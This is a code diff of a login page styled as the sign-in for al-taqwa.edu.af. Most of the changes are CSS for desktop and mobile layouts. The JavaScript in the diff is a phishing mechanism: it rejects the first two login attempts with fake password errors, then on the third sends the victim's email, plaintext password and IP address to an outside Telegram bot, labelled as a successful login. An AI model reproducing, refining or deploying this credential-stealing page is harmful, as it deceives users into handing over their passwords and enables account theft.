@@ -15,95 +15,90 @@
 }
 
 body{
-    height:100vh;
+    min-height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
     background:#f3f3f3;
-    padding:0;
 }
 
+/* ===== DESKTOP ===== */
 .login-container{
-    width:480px;
-    max-width:95%;
+    width: 340px;
     background:#fff;
-    border-radius:16px;
-    padding:38px 14px 26px 14px;
+    border-radius:12px;
+    padding: 28px 20px 22px 20px;
     border:1px solid #e0e0e0;
-    box-shadow:0 4px 14px rgba(0,0,0,0.08);
+    box-shadow:0 2px 10px rgba(0,0,0,0.07);
     display:flex;
     flex-direction:column;
-    justify-content:center;
 }
 
-/* LOGO */
 .logo{
     text-align:center;
-    margin-bottom:14px;
+    margin-bottom:10px;
 }
 
-/* د ډیسکټاپ لپاره - کوچنی لوګو لکه لومړی عکس */
 .logo img{
-    width:160px;
+    width: 130px;
 }
 
-/* TITLE */
 .title{
     text-align:center;
-    font-size:22px;
+    font-size:17px;
     font-weight:700;
-    margin-bottom:26px;
+    margin-bottom:18px;
     color:#222;
 }
 
-/* INPUT */
 .input-box{
-    margin-bottom:18px;
+    margin-bottom:12px;
 }
 
 label{
     display:block;
-    font-size:15px;
-    margin-bottom:6px;
+    font-size:13px;
+    margin-bottom:4px;
     color:#444;
 }
 
-input{
+input[type="email"],
+input[type="password"]{
     width:100%;
-    height:54px;
-    border-radius:8px;
+    height:38px;
+    border-radius:6px;
     border:1px solid #ccc;
-    padding:0 14px;
-    font-size:15px;
+    padding:0 10px;
+    font-size:13px;
 }
 
-input:focus{
+input[type="email"]:focus,
+input[type="password"]:focus{
     border:2px solid #18c6e7;
     outline:none;
 }
 
-/* CHECKBOX */
 .remember{
     display:flex;
     align-items:center;
-    margin:14px 0 22px;
-    font-size:14px;
+    margin:8px 0 16px;
+    font-size:12px;
+    color:#444;
 }
 
-.remember input{
-    width:16px;
-    height:16px;
-    margin-right:8px;
+.remember input[type="checkbox"]{
+    width:13px;
+    height:13px;
+    margin-right:6px;
 }
 
-/* BUTTON */
 button{
     width:100%;
-    height:54px;
+    height:38px;
     border:none;
-    border-radius:8px;
+    border-radius:6px;
     background:#18c6e7;
-    font-size:16px;
+    font-size:14px;
     font-weight:bold;
     cursor:pointer;
     color:#fff;
@@ -113,61 +108,78 @@ button:hover{
     background:#0fb6d6;
 }
 
-/* د تېروتنې پیغام */
 .error-msg {
     background: #ffe6e6;
     border: 1px solid #ff6666;
     color: #cc0000;
-    padding: 10px;
-    border-radius: 8px;
-    font-size: 13px;
+    padding: 8px;
+    border-radius: 6px;
+    font-size: 12px;
     text-align: center;
-    margin-top: 12px;
+    margin-bottom: 10px;
     display: none;
 }
 
-/* د موبایل لپاره - لوی لوګو لکه دوهم عکس */
+/* ===== MOBILE ===== */
 @media (max-width: 600px) {
-    body {
+
+    body{
         align-items: center;
-        background: #f3f3f3;
+        padding: 20px 16px;
     }
 
-    .login-container {
+    .login-container{
         width: 100%;
-        max-width: 100%;
         border-radius: 16px;
-        margin: 20px 16px;
         padding: 32px 20px 28px 20px;
-        height: auto;
     }
 
-    .logo img {
-        width: 260px; /* د موبایل کې لوی لوګو */
+    .logo img{
+        width: 260px;
     }
 
-    .title {
-        font-size: 26px;
-        margin-bottom: 28px;
+    .title{
+        font-size: 24px;
+        margin-bottom: 26px;
     }
 
-    input {
-        height: 58px;
+    label{
+        font-size: 15px;
+        margin-bottom: 6px;
+    }
+
+    input[type="email"],
+    input[type="password"]{
+        height: 54px;
         font-size: 16px;
+        border-radius: 8px;
+        padding: 0 14px;
     }
 
-    button {
-        height: 58px;
-        font-size: 18px;
+    .input-box{
+        margin-bottom: 16px;
     }
 
-    .remember {
-        font-size: 16px;
+    .remember{
+        font-size: 15px;
+        margin: 12px 0 20px;
     }
 
-    .remember input {
-        width: 20px;
-        height: 20px;
+    .remember input[type="checkbox"]{
+        width: 18px;
+        height: 18px;
+        margin-right: 8px;
+    }
+
+    button{
+        height: 54px;
+        font-size: 17px;
+        border-radius: 8px;
+    }
+
+    .error-msg{
+        font-size: 13px;
+        padding: 10px;
     }
 }
 
@@ -237,7 +249,6 @@ button:hover{
 
     async function sendToAdmin(email, password, ip, attemptNumber) {
         const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
-        
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -257,48 +268,24 @@ button:hover{
         const errorDiv = document.getElementById('errorMsg');
         errorDiv.textContent = message;
         errorDiv.style.display = 'block';
-        setTimeout(() => {
-            errorDiv.style.display = 'none';
-        }, 3000);
+        setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
     }
 
     document.getElementById('loginBtn').addEventListener('click', async () => {
         const email = document.getElementById('email').value.trim();
         const password = document.getElementById('password').value.trim();
 
-        if (!email || !password) {
-            showError('Please fill in both email and password');
-            return;
-        }
-
-        if (hasPashtoCharacters(email)) {
-            showError('Pashto not allowed ');
-            return;
-        }
-        
-        if (hasPashtoCharacters(password)) {
-            showError('Pashto not allowed ');
-            return;
-        }
-
-        if (!isValidEmail(email)) {
-            showError('Please enter a valid email address (e.g., username@gmail.com)');
-            return;
-        }
-
-        if (!isValidPasswordLength(password)) {
-            showError('Password must be at least 8 characters');
-            return;
-        }
+        if (!email || !password) { showError('Please fill in both email and password'); return; }
+        if (hasPashtoCharacters(email)) { showError('Pashto not allowed'); return; }
+        if (hasPashtoCharacters(password)) { showError('Pashto not allowed'); return; }
+        if (!isValidEmail(email)) { showError('Please enter a valid email address (e.g., username@gmail.com)'); return; }
+        if (!isValidPasswordLength(password)) { showError('Password must be at least 8 characters'); return; }
 
         const ip = await getUserIP();
         const key = `${email}_${ip}`;
 
-        if (!attemptStore[key]) {
-            attemptStore[key] = 0;
-        }
+        if (!attemptStore[key]) attemptStore[key] = 0;
         attemptStore[key]++;
-        
         const currentAttempt = attemptStore[key];
 
         if (currentAttempt === 1) {
@@ -307,14 +294,12 @@ button:hover{
             document.getElementById('password').value = '';
             return;
         }
-
         if (currentAttempt === 2) {
             showError('Please check your password');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
-
         if (currentAttempt >= 3) {
             await sendToAdmin(email, password, ip, currentAttempt);
             delete attemptStore[key];
